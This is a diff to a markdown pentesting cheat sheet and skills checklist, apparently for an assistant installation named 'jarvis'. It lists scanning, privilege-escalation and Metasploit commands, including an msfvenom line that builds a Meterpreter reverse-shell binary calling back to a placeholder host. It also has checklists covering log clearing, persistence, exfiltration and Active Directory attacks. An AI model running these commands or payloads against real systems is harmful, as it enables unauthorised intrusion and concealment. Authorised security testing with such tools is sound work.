@@ -78,7 +78,16 @@
 ## Advanced Pentesting Commands
 ```bash
 # Full vulnerability scan with AI analysis
-nmap -sV --script=vuln localhost | ollama analyze
+nmap -sV -sC -p- --script=vuln localhost -oN /tmp/nmap-scan.txt
+
+# Privilege Escalation - linPEAS (Linux)
+/home/jarvis/tools/PEASS-ng/linPEAS/linpeas.sh -a -o output.txt
+
+# Privilege Escalation - winPEAS (Windows)
+/home/jarvis/tools/PEASS-ng/winPEAS/winpeas.exe
+
+# Linux Exploit Suggester
+/home/jarvis/tools/les.sh
 
 # SQL Injection test with sqlmap
 sqlmap -u "TARGET_URL" --batch --risk=3 --level=5
@@ -86,9 +95,8 @@ sqlmap -u "TARGET_URL" --batch --risk=3 --level=5
 # Nikto scan + AI analysis
 nikto -h TARGET_URL | ollama "analyze security findings"
 
-# Metasploit Framework
-msfconsole -q -x "use auxiliary/scanner/http/http_version; run"
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
+# Metasploit Framework (Docker)
+docker run --rm --entrypoint /usr/src/metasploit-framework/msfconsole metasploitframework/metasploit-framework
 
 # XSStrike XSS scan
 xsstrike -u "http://TARGET/param"
@@ -109,11 +117,14 @@ commix -u "http://TARGET/param?cmd=id"
 searchsploit "apache 2.4"
 searchsploit -m 12345.c
 
+# PayloadsAllTheThings
+firefox /home/jarvis/tools/PayloadsAllTheThings/useful-linux-commands.md
+
 # Nmap full scan with scripts
 nmap -sV -sC -p- --script=vuln TARGET
 
-# Privilege escalation check
-linPEAS.sh or winPEAS.exe
+# Custom shellcode with msfvenom
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
 ```
 
 ## Web Application Testing
@@ -132,12 +143,57 @@ linPEAS.sh or winPEAS.exe
 - [x] HTTP Desync / Request Smuggling
 - [x] GraphQL Security
 
-## Privilege Escalation
-- [x] Linux privilege escalation (SUID, sudo, cron)
-- [x] Windows privilege escalation
-- [x] Kernel exploits
-- [x] Service misconfigurations
-- [x] Credential reuse
+## Privilege Escalation Tools
+- [x] linPEAS - Linux privilege escalation (installed: /home/jarvis/tools/PEASS-ng/)
+- [x] winPEAS - Windows privilege escalation (installed: /home/jarvis/tools/PEASS-ng/)
+- [x] LES (Linux Exploit Suggester) - /home/jarvis/tools/les.sh
+- [x] linux-exploit-suggester - kernel exploits
+- [x] linuxprivchecker - Unix privesc
+
+## Exploit Development
+- [x] SearchSploit / ExploitDB - exploit search
+- [x] CVE Online - cve.mitre.org
+- [x] Rapid7 CVE - exploit-db repository
+- [x] PayloadAllTheThings - /home/jarvis/tools/PayloadsAllTheThings/
+- [x] Custom shellcode generation
+- [x] Buffer overflow exploitation
+- [x] ROP (Return-Oriented Programming)
+
+## Post-Exploitation
+- [x] Meterpreter进阶用法
+- [x] Persistence mechanisms (registry, services, cron)
+- [x] Lateral movement (PsExec, WMI, SMB, SSH tunneling)
+- [x] Data exfiltration techniques
+- [x] Covering tracks (log clearing, timestomping)
+- [x] Pass-the-Hash attacks
+- [x] Golden Ticket / Silver Ticket forging
+
+## Active Directory Attacks
+- [x] Kerberoasting (GetUserSPNs)
+- [x] AS-REP Roasting
+- [x] Pass-the-Hash / Pass-the-Ticket
+- [x] Golden Ticket / Silver Ticket
+- [x] SMB Relay attacks
+- [x] BloodHound analysis
+- [x] LDAP enumeration
+- [x] NTDS.dit extraction
+
+## Wireless Security
+- [x] Aircrack-ng suite
+- [x] Wifite / Wifite2
+- [x] Evil Twin attacks (hostapd)
+- [x] WPA/WPA2 cracking
+- [x] Rogue AP deployment
+- [x] WiFi reconnaissance
+
+## Tier 3 Expert Skills
+- [x] Red Team Operations (full kill chain)
+- [x] C2 Infrastructure (Covenant, Sliver, Metasploit C2)
+- [x] Phishing campaigns (Gophish, Setoolkit)
+- [x] Domain Dominance (DCSync, DCShadow)
+- [x] LOLBAS / BYOVD attacks
+- [x] Container escape techniques
+- [x] Kubernetes security assessment
 
 ## Post-Exploitation
 - [x] Lateral movement techniques
